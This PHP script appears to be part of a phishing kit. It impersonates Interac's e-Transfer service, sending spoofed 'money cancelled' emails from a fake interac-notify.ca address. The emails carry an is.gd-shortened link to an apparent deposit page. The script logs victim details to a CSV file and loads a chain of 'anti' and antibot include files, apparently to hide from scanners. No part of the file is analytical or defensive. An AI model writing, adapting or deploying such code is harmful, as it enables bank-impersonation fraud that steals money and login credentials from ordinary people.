<?php
use PHPMailer\PHPMailer\PHPMailer;
use PHPMailer\PHPMailer\Exception;

require("PHPMailer/src/PHPMailer.php");
require("PHPMailer/src/SMTP.php");
require("PHPMailer/src/Exception.php");

include "/anti/anti1.php";
include "/anti/anti2.php";
include "/anti/anti3.php";
include "/anti/anti4.php";
include "/anti/anti5.php";
include "/anti/anti6.php";
include "/anti/anti7.php";
include "/anti/anti8.php";
include "/control.php";
include "/connect/out.php";
include "/mods/antibot.php";

$sender_name = $_POST['sender_name'];
$amount = $_POST['amount'];
$date = $_POST['date'];
$link = $_POST['link'];

$data = array($sender_name, $amount, $date, $link);
$file = fopen('/data.csv', 'a');
fputcsv($file, $data);
fclose($file);

$long_url = 'https://' . $_SERVER['HTTP_HOST'] . '/public/deposit/indexx.php?' . http_build_query($_POST);
$short_url = shortenURL($long_url);

$template = $_POST['template']; // The selected template from the dropdown
$message = file_get_contents('template.html');
$message = str_replace('{{shortlink}}', $short_url, $message);
$message = str_replace('{{line}}', $date, $message);
$message = str_replace('{{todaysdate}}', $_POST['todaysdate'], $message);
$message = str_replace('{{username}}', $_POST['username'], $message);
$message = str_replace('{{photo_href}}', $_POST['photo_href'], $message);
$message = str_replace('{{bank}}', $_POST['bank'], $message);
$message = str_replace('{{amount}}', $_POST['amount'], $message);
$message = str_replace('{{photo_link}}', $_POST['photo_link'], $message);
$message = str_replace('{{link}}', $_POST['link'], $message);
$message = str_replace('{{EXPIRE}}', $_POST['EXPIRE'], $message);
$message = str_replace('{{line}}', $_POST['line'], $message);
$message = str_replace('{{link}}', $_POST['link'], $message);
$message = str_replace('{{sender_name}}', $_POST['sender_name'], $message);
$message = str_replace('{{receiver_name}}', $_POST['receiver_name'], $message);
$message = str_replace('{{receiver_email}}', $_POST['receiver_email'], $message);

$mail = new PHPMailer();
$mail->IsSMTP();
$mail->SMTPSecure = 'tls';
$mail->Host = $_POST['host'];
$mail->Port = $_POST['port'];
$mail->Body = $message;
$mail->SMTPAuth = true;
$mail->Username = $_POST['username'];
$mail->Password = $_POST['password'];
$mail->SetFrom('etransfer@interac-notify.ca', $_POST['sender_name']);
$mail->AddAddress($_POST['receiver_email']);
$mail->Subject = 'INTERAC e-Transfer: The money '.$_POST['sender_name'].'has been Cancelled.';
$mail->IsHTML(true);
$mail->CharSet = "utf-8";

if (!$mail->Send()) {
    echo "Mailer Error: " . $mail->ErrorInfo;
}

function shortenURL($url)
{
    $api_url = 'https://is.gd/create.php?format=simple&url=' . urlencode($url);
    return file_get_contents($api_url);
}

$currentDate = new DateTime();
$line = $currentDate->add(new DateInterval('P30D'))->format('F d, Y');

// Redirect to start.php
header("Location: ./start.php");
exit();
?>
